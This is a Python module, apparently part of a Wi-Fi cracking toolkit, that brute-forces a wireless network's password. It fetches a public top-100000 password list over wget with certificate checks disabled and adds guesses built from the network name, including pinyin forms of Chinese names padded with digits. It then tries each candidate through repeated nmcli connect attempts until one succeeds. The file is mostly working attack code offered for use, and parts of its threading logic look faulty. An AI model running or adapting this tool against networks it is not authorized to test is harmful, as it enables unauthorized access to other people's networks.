#!/usr/bin/env python
# -*- coding: utf-8 -*-
# *********************************************************
#       Created:     2025-1-2   10:00
#       Filename:    brute_force.py
#       Author:   ______
#                    / /  (_)
#                   / /_  /\____  ____  __   ______
#                  / __ \/ / __ \/ __ \/ /  / /
#                 / /_/ / / / / / / / / /__/ /
#                /_____/_/_/ /_/_/ /_/\___  /
#               ========== ______________/ /
#                          \______________/
#
#       Email:       Binny@vip.163.com
#       Group:       SP
#       Create By:   Binny
#       Purpose:     暴力破解 wifi
#       Copyright:   TJYM(C) 2014 - All Rights Reserved
#       LastModify:  2025-1-2
# *********************************************************

# 借鉴 https://github.com/flancast90/wifi-bf/
from ..model.attack_win import Attack
from ..util.color_win import Color
from ..config_win import Configuration
from ..util.process_win import Process
from ..tools.airmon_win import Airmon
from ..model.brute_force_result_win import CrackResultBruteForce

# pip install pywifi comtypes
import urllib.request
import gevent
# pip install pypinyin
from pypinyin import pinyin, Style
import itertools
from collections import OrderedDict

class AttackBruteForce(Attack):
    @staticmethod
    def can_attack_bruteforce():
        return True

    def __init__(self, target):
        super(AttackBruteForce, self).__init__(target)
        self.success = False
        self.crack_result = None
        # Password list
        self.password_file = Configuration.linux.join(Configuration.data_dir, '10-million-password-list-top-100000.txt')
        if  not Configuration.linux.exists(self.password_file):
            default_url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt"
            command = [
                'wget',
                '--no-check-certificate', # 当从不受信任的站点下载HTTPS文件时，可能会遇到无效SSL证书的问题
                '-O', self.password_file,
                '-a', '4', # 尝试 4 次
                default_url
            ]
            Color.pl('{+} {D}Running: {W}{P}%s{W}' % ' '.join(command))
            process = Process(command)
            stdout, stderr = process.get_output()

        if  Configuration.linux.exists(self.password_file):
            passwords_dict = Configuration.linux.readfile(self.password_file)
            additions = ['12345678',
                         '12345678Z',
                         '1qaz@WSX']
            passwords = []
            passwords.extend(additions)
            # 加入和 WiFi 热点相关的密码
            # 如果是中文，转换成拼音然后再加入密码
            if self.target.essid_known:
                essid = self.target.essid.lower()
                if AttackBruteForce.contains_chinese(essid):
                    pass_pinying_full = ''
                    pass_pinying_short = ''
                    for _char in essid:
                        if AttackBruteForce.is_chinese_char(_char):
                            pinyin_text = AttackBruteForce.to_pinyin(_char)
                            pass_pinying_full += pinyin_text
                            pass_pinying_short += pinyin_text[0]
                        else:
                            pass_pinying_full += _char
                            pass_pinying_short += _char
                    if pass_pinying_full != pass_pinying_short:
                        passwords.extend(AttackBruteForce.expand_password(pass_pinying_full))
                        passwords.extend(AttackBruteForce.expand_password(pass_pinying_short))
                    else:
                        passwords.extend(AttackBruteForce.expand_password(essid))
                else:
                    passwords.extend(AttackBruteForce.expand_password(essid))

            for password in passwords_dict.split('\n'):
                password = password.strip()
                if password:
                    if isinstance(password, str):
                        decoded_line = password
                    else:
                        decoded_line = password.decode("utf-8")
                    # 只针对有效的密码
                    if len(decoded_line) >= 8:
                        passwords.append(decoded_line)
            self.passwords = AttackBruteForce.unique_in_order(passwords)

    def fetch_password_from_url(self, url):
        try:
            return urllib.request.urlopen(url)
        except:
            return None

    # 定义一个函数，使用 OrderedDict 来保持顺序
    @staticmethod
    def unique_in_order(sequence):
        # 将序列中的元素添加到 OrderedDict 中，自动去重
        return list(OrderedDict.fromkeys(sequence))

    @staticmethod
    def expand_password(password):
        if len(password) < 8:
            len_rest = 8 - len(password)
            combination  = AttackBruteForce.number_combinations([str(i) for i in range(10)], len_rest)
            return [password + p for p in combination]
        return [password]

    @staticmethod
    def number_combinations(nums, r):
        return list(map(''.join, itertools.product(nums, repeat=r)))
    
    @staticmethod
    def contains_chinese(s):
        for ch in s:
            if AttackBruteForce.is_chinese_char(ch):
                return True
        return False
    
    @staticmethod
    def is_chinese_char(ch):
        if '\u4e00' <= ch <= '\u9fff':
            return True
        return False

    @staticmethod
    def to_pinyin(text):
        _pinying = ''.join([i[0] for i in pinyin(text, style=Style.TONE3)])
        # 最后一个是音调
        if _pinying[-1].isdigit():
            return _pinying[:-1]
        return _pinying
    
    def run(self):
        if self.target.essid_known:
            return self.run_bruteforce(self.target.essid)

    def crack_wifi(self, essid, password):
        # when when obtain password from url we need the decode utf-8 however we doesnt when reading from file
        command = [
            "nmcli",
            "dev",
            "wifi",
            "connect",
            essid,
            "password",
            password
        ]
        Color.pl('{+} {D}Running: {W}{P}%s{W}' % ' '.join(command))
        process = Process(command)
        gevent.sleep(10)
        stderr = process.stderr()
        stdout = process.stdout()
        if stderr and "error" in stderr.lower():
            if Configuration.verbose > 0:
                Color.pl("{R}Password{W} " + password + "' {R}failed.{W}")
        elif stdout and "successfull" in stdout.lower():
            self.crack_result = CrackResultBruteForce(self.target.bssid, essid=essid, ascii_key=password)
        else:
            pass

    def run_bruteforce_multi(self, essid):
        try:
            Airmon.use_ipiw = False
            Airmon.stop(Configuration.interface)
            # 等待将无线网卡由监视模式转成正常的模式
            gevent.sleep(5)
        except Exception as ex:
            pass
        count = 5
        i = 0
        crack_events = []
        for password in self.passwords:
            if self.crack_result:
                # 停止所有的线程
                self.success = True
                return True
            # 每5个密码放入处理池中
            i += 1
            if i % count == 0:
                gevent.joinall(crack_events)
                crack_events = []
            else:
                if password == '12345678Z':
                    password = password
                g = gevent.spawn(self.crack_wifi, essid, password)
                g.throw(gevent.GreenletExit)
                crack_events.append(g)
                continue
        if crack_events:
            # 剩下的继续
            gevent.joinall(crack_events)
        return False

    def run_bruteforce(self, essid):
        try:
            Airmon.use_ipiw = False
            Airmon.stop(Configuration.interface)
            # 等待将无线网卡由监视模式转成正常的模式
            gevent.sleep(5)
        except Exception as ex:
            pass
        
        for password in self.passwords:
            if self.crack_result:
                # 停止所有的线程
                self.success = True
                return True
            
            if password == '12345678Z':
                password = password
            g = gevent.spawn(self.crack_wifi, essid, password)
            # g.throw(gevent.GreenletExit)
            g.join()

        return False